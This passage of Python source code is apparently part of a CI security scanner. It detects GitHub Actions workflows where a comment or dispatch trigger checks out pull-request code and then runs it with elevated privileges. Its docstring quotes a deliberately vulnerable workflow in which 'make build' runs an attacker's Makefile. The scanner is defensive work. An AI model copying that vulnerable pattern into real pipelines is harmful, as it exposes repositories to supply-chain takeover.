    - A maintainer comments to trigger CI (e.g., "/run-tests")
    - The maintainer's permission allows the workflow to run
    - The attacker's malicious code executes with elevated privileges

    Example vulnerable pattern (gevals.yaml):
        on:
          issue_comment:
            types: [created]
        jobs:
          check-trigger:
            if: contains(github.event.comment.body, '/run-gevals')
            outputs:
              pr-ref: refs/pull/${{ github.event.issue.number }}/head
          run-evaluation:
            needs: check-trigger
            steps:
              - uses: actions/checkout@v6
                with:
                  ref: ${{ needs.check-trigger.outputs.pr-ref }}
              - run: make build  # Executes attacker's Makefile!
    """

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for confused deputy vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        # Check for dispatch-style triggers
        has_issue_comment = _has_trigger(workflow, "issue_comment")
        has_repository_dispatch = _has_trigger(workflow, "repository_dispatch")

        if not (has_issue_comment or has_repository_dispatch):
            return []

        # For issue_comment, check if workflow references PR context
        if has_issue_comment and not self._references_pr_context(workflow):
            return []

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            # Find checkout of PR code
            checkout_result = self._find_pr_checkout(steps, workflow, job_name)
            if not checkout_result:
                continue

            checkout_index, checkout_ref = checkout_result

            # Find dangerous execution after checkout
            exec_result = self._find_dangerous_exec(steps, checkout_index)
            if not exec_result:
                continue

            exec_index, exec_type, exec_value = exec_result

            checkout_line = _get_line_number(content, job_name, checkout_index)
            exec_line = _get_line_number(content, job_name, exec_index)
            protection, protection_detail = self._analyze_protection(workflow, job_name)
            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

            vulnerabilities.append(
                VulnerableJob(
                    workflow_path=workflow_path,
                    job_name=job_name,
                    checkout_line=checkout_line,
                    checkout_ref=checkout_ref,
                    exec_line=exec_line,
                    exec_type=exec_type,
                    exec_value=exec_value,
                    has_authorization=False,
                    branch=branch,
                    protection=protection,
                    protection_detail=protection_detail,
                    vulnerability_type=VulnerabilityType.DISPATCH_CHECKOUT.value,
                )
            )

        return vulnerabilities

    def _references_pr_context(self, workflow: dict) -> bool:
        """Check if workflow references PR context from issue_comment."""
        workflow_str = str(workflow)
        return any(re.search(pattern, workflow_str) for pattern in ISSUE_COMMENT_PR_PATTERNS)

    def _find_pr_checkout(
        self, steps: list, workflow: dict, job_name: str
    ) -> tuple[int, str] | None:
        """Find a checkout step that uses PR ref from dispatch context.

        Returns (step_index, ref_value) or None.
        """
        jobs = workflow.get("jobs", {})

        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if not uses or "actions/checkout" not in str(uses):
                continue

            with_block = step.get("with", {})
            if not isinstance(with_block, dict):
                continue

            ref = str(with_block.get("ref", ""))
            if not ref:
                continue

            # Check for direct dispatch checkout patterns
            for pattern in DISPATCH_PR_CHECKOUT_PATTERNS:
                if re.search(pattern, ref, re.IGNORECASE):
                    return (i, ref)

            # Check if ref comes from a job output that references PR
            if "needs." in ref and ".outputs." in ref:
                # Extract the job name from the ref
                needs_match = re.search(r"needs\.([^.]+)\.outputs\.([^}]+)", ref)
                if needs_match:
                    dep_job_name = needs_match.group(1)
                    output_name = needs_match.group(2).strip()

                    # Check if the dependency job constructs a PR ref
                    dep_job = jobs.get(dep_job_name, {})
                    if self._job_outputs_pr_ref(dep_job, output_name):
                        return (i, ref)

            # Check for gh pr checkout in run steps
            run = step.get("run", "")
            if run and re.search(r"gh\s+pr\s+checkout", str(run)):
                return (i, "gh pr checkout")

        # Also check run steps for gh pr checkout
        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            run = step.get("run", "")
            if run and re.search(r"gh\s+pr\s+checkout", str(run)):
                return (i, "gh pr checkout")

        return None

    def _job_outputs_pr_ref(self, job: dict, output_name: str) -> bool:
        """Check if a job's output constructs a PR ref."""
        steps = job.get("steps", [])
        if not isinstance(steps, list):
            return False

        for step in steps:
            if not isinstance(step, dict):
                continue

            run_block = step.get("run", "")
            if not run_block:
                continue

            run_str = str(run_block)

            # Check if this step sets the output with a PR ref pattern
            # Pattern: echo "output-name=refs/pull/.../head" >> $GITHUB_OUTPUT
            output_pattern = rf"{output_name}=refs/pull/"
            if re.search(output_pattern, run_str):
                return True

            # Also check for pr-ref or similar patterns
            if re.search(r"refs/pull/.*/(head|merge)", run_str) and (
                output_name in run_str or output_name.replace("-", "_") in run_str
            ):
                return True

        return False

    def _find_dangerous_exec(self, steps: list, checkout_index: int) -> tuple[int, str, str] | None:
        """Find a dangerous exec step after the checkout.

        Returns (step_index, exec_type, exec_value) or None.
        """
        for i, step in enumerate(steps):
            if i <= checkout_index:
                continue

            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if _is_local_action(uses):
                return (i, "local_action", str(uses))

            run = step.get("run", "")
            if _is_dangerous_command(run):
                cmd_str = str(run).strip()
                first_line = cmd_str.split("\n")[0].strip()[:50]
                return (i, "build_command", first_line)

        return None


# Convenience functions for standalone usage
def analyze_workflow(workflow_path: Path) -> list[VulnerableJob]:
    """Analyze a workflow file for PwnRequest vulnerabilities."""
    detector = PwnRequestDetector()
    return detector.analyze_workflow(workflow_path)


def analyze_workflow_all(workflow_path: Path) -> list[VulnerableJob]:
    """Analyze a workflow file for all vulnerability types."""
    results = []
    pwn_detector = PwnRequestDetector()
    workflow_run_detector = WorkflowRunDetector()
    context_injection_detector = ContextInjectionDetector()
    artifact_injection_detector = ArtifactInjectionDetector()
    dispatch_checkout_detector = DispatchCheckoutDetector()
    results.extend(pwn_detector.analyze_workflow(workflow_path))
    results.extend(workflow_run_detector.analyze_workflow(workflow_path))
    results.extend(context_injection_detector.analyze_workflow(workflow_path))
    results.extend(artifact_injection_detector.analyze_workflow(workflow_path))
    results.extend(dispatch_checkout_detector.analyze_workflow(workflow_path))
    return results


def scan_directory(directory: Path) -> ScanResult:
    """Scan a directory for all vulnerable workflows."""
    pwn_detector = PwnRequestDetector()
    workflow_run_detector = WorkflowRunDetector()
    context_injection_detector = ContextInjectionDetector()
    artifact_injection_detector = ArtifactInjectionDetector()
    dispatch_checkout_detector = DispatchCheckoutDetector()
    result = ScanResult()

    workflows_dir = directory / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return result

    for yaml_file in workflows_dir.iterdir():
        if not yaml_file.is_file():
            continue
        if yaml_file.suffix not in (".yml", ".yaml"):
            continue
        try:
            # Run all detectors
            pwn_vulns = pwn_detector.analyze_workflow(yaml_file)
            workflow_run_vulns = workflow_run_detector.analyze_workflow(yaml_file)
            context_injection_vulns = context_injection_detector.analyze_workflow(yaml_file)
            artifact_injection_vulns = artifact_injection_detector.analyze_workflow(yaml_file)
            dispatch_checkout_vulns = dispatch_checkout_detector.analyze_workflow(yaml_file)
            result.vulnerabilities.extend(pwn_vulns)
            result.vulnerabilities.extend(workflow_run_vulns)
            result.vulnerabilities.extend(context_injection_vulns)
            result.vulnerabilities.extend(artifact_injection_vulns)
            result.vulnerabilities.extend(dispatch_checkout_vulns)
            result.files_scanned += 1
        except Exception as e:
            result.errors.append(f"{yaml_file}: {e}")

    return result
